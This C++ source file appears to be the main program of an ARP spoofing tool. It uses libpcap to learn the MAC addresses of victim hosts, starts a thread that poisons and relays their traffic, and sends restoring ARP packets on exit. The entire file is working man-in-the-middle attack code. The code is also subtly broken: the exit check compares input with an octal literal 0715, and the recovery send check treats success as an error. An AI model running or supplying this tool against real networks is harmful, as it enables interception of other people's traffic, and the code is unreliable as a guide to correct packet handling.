#include <thread>
#include "arpManage.h"
#include "extraFunc.h"
using namespace std;

int main(int argc, char* argv[])
{
    if(argc < 6){
        printf("Parameter Error\n");
        printf("example) ./arpSpoofing wlan0 192.168.0.2 192.168.0.1 192.168.0.1 192.168.0.2\n");
        return -1;
    }
    int res1, recovery_check;
    char *dev =argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct libnet_ethernet_hdr* ep;
    struct arp_hdr* ap;
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
    if(handle == nullptr){
        printf("Couldn't open device %s: %s\n",dev, errbuf);
        return -1;
    }

    struct spoofingInfo ah;
    // Get Host Interface Mac, Ip
    gethostinfo(argv[1],ah.hostmac,0);//mac
    gethostinfo(argv[1],ah.hostip,1);//ip

    if( GetIpArr(ah.senderip1,argv[2]) || GetIpArr(ah.targetip1,argv[3]) || GetIpArr(ah.senderip2,argv[4]) || GetIpArr(ah.targetip2,argv[5]) ){
        printf("Sender & Target Ip Get Error\n");
        return -1;
    }
    SetAddArp(ah.pkt,ah.broad_arr,ah.hostmac,ah.hostip,ah.null_arr,ah.senderip1);

    while(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){//waiting sender1's reply packet.
        res1=pcap_next_ex(handle, &header, &packet);
        if(res1 != 1){
            printf("Packet Reading Error 1!!\n");
            return -1;
        }
        ep = reinterpret_cast<struct libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        ap = reinterpret_cast<struct arp_hdr*>(const_cast<u_char*>(packet) + sizeof(libnet_ethernet_hdr));
        if( ntohs(ep->ether_type) == 0x0806 && ntohs(ap->ar_op) == ARPOP_REPLY
                && (inet_addr(argv[2])&0x000000FF) == ap->sender_ip[0] && ((inet_addr(argv[2])&0x0000FF00)>>8) == ap->sender_ip[1]
                && ((inet_addr(argv[2])&0x00FF0000)>>16) == ap->sender_ip[2] && ((inet_addr(argv[2])&0xFF000000)>>24) == ap->sender_ip[3] ){
            memcpy(ah.sendermac1,packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr),6);
            break;
        }
    }

    SetAddArp(ah.pkt,ah.broad_arr,ah.hostmac,ah.hostip,ah.null_arr,ah.targetip1 );
    while(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){//waiting target1's arp reply packet.
        if(!pcap_next_ex(handle, &header, &packet)){
            printf("Packet Reading Error 1!!\n");
            return -1;
        }
        ep = reinterpret_cast<struct libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        ap = reinterpret_cast<struct arp_hdr*>(const_cast<u_char*>(packet) + sizeof(libnet_ethernet_hdr));
        if( ntohs(ep->ether_type) == 0x0806 && ntohs(ap->ar_op) == ARPOP_REPLY
                && (inet_addr(argv[3])&0x000000FF) == ap->sender_ip[0] && ((inet_addr(argv[3])&0x0000FF00)>>8) == ap->sender_ip[1]
                && ((inet_addr(argv[3])&0x00FF0000)>>16) == ap->sender_ip[2] && ((inet_addr(argv[3])&0xFF000000)>>24) == ap->sender_ip[3] ){
            memcpy(ah.targetmac1,packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr),6);
            break;
        }
    }

    SetAddArp(ah.pkt,ah.broad_arr,ah.hostmac,ah.hostip,ah.null_arr,ah.senderip2);
    while(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){//waiting sender2 reply packet.
        if(!pcap_next_ex(handle, &header, &packet)){
            printf("Packet Reading Error 1!!\n");
            return -1;
        }
        ep = reinterpret_cast<struct libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        ap = reinterpret_cast<struct arp_hdr*>(const_cast<u_char*>(packet) + sizeof(libnet_ethernet_hdr));
        if( ntohs(ep->ether_type) == 0x0806 && ntohs(ap->ar_op) == ARPOP_REPLY
                && (inet_addr(argv[4])&0x000000FF) == ap->sender_ip[0] && ((inet_addr(argv[4])&0x0000FF00)>>8) == ap->sender_ip[1]
                && ((inet_addr(argv[4])&0x00FF0000)>>16) == ap->sender_ip[2] && ((inet_addr(argv[4])&0xFF000000)>>24) == ap->sender_ip[3] ){
            memcpy(ah.sendermac2,packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr),6);
            break;
        }
    }

    SetAddArp(ah.pkt,ah.broad_arr,ah.hostmac,ah.hostip,ah.null_arr,ah.targetip2);
    while(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){//waiting target2 reply packet.
        if(!pcap_next_ex(handle, &header, &packet)){
            printf("Packet Reading Error 1!!\n");
            return -1;
        }
        ep = reinterpret_cast<struct libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        ap = reinterpret_cast<struct arp_hdr*>(const_cast<u_char*>(packet) + sizeof(libnet_ethernet_hdr));
        if( ntohs(ep->ether_type) == 0x0806 && ntohs(ap->ar_op) == ARPOP_REPLY
                && (inet_addr(argv[5])&0x000000FF) == ap->sender_ip[0] && ((inet_addr(argv[5])&0x0000FF00)>>8) == ap->sender_ip[1]
                && ((inet_addr(argv[5])&0x00FF0000)>>16) == ap->sender_ip[2] && ((inet_addr(argv[5])&0xFF000000)>>24) == ap->sender_ip[3] ){
            memcpy(ah.targetmac2,packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr),6);
            break;
        }
    }

    // Relay & Infect Func Thread Start
    struct spoofingInfo ah_backup;
    memcpy(&ah_backup,&ah,sizeof(ah));
    arpManage arp;
    thread th1 = thread(&arpManage::infection, &arp, ah_backup);

    // Finish Waiting
    while(1){
        printf("If you want to exit,\nInsert \"0715\"\n Insert : ");
        scanf("%d",&recovery_check);
        if(recovery_check == 0715){
            //Sending a recovery packet
            SetAddArp(ah.pkt,ah.sendermac1,ah.targetmac1,ah.targetip1,ah.sendermac1,ah.senderip1);
            if(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){
                printf("Packet send error !!\n");
                return -1;
            }
            SetAddArp(ah.pkt,ah.sendermac2,ah.targetmac2,ah.targetip2,ah.sendermac2,ah.senderip2);
            if(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){
                printf("Packet send error !!\n");
                return -1;
            }
            break;
        }
        else {
            continue;
        }
    }
    cout << "Arp Spoofing End" << endl;
    return 0;
}

